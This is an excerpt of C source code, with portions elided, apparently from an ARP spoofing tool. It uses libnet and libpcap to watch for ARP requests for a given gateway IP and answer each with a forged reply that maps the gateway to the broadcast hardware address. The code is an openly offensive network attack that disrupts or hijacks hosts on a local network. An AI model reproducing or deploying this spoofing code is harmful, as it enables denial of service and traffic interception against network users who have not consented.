...
/* If you can recoginze where this header came from without digging, I'll give
 * you a scooby snack :)
 */
struct arp_hdr
{
...
void arp_spoof_reply(struct link_int *iface, char *dev, struct arp_hdr *arp)
{
    ...
    libnet_build_ethernet(arp->ar_sha, bcast, ETHERTYPE_ARP, NULL, 0, pkt); 
    libnet_build_arp(ARPHRD_ETHER, ETH_P_IP, ETH_ALEN, 4, ARPOP_REPLY,
	    bcast, arp->ar_tip, arp->ar_sha, arp->ar_sip, NULL, 0, pkt + ETH_H);
    if(libnet_write_link_layer(iface, dev, pkt, sizeof(pkt)) 
	    != sizeof(pkt))
	perror("Write link layer");
}
...
int main(int argc, char **argv)
{
    ...
    if(argc < 2)
    {
	printf("usage: %s <gw ip>\n", argv[0]);
	exit(1);
    }
    
    gwip = libnet_name_resolve(argv[1], 0);
    ...
    while(1)
    {
	arpfr = (struct ethframe *) pcap_next(pd, &h);
	
	if(((struct eth_hdr *)arpfr->eth)->ftype == htons(ETHERTYPE_ARP)
		&& !memcmp(((struct arp_hdr *)arpfr->arp)->ar_tip, &gwip, 4))
	{
	    arp_spoof_reply(intf, dev, (struct arp_hdr *)arpfr->arp);
	}
    }	
}
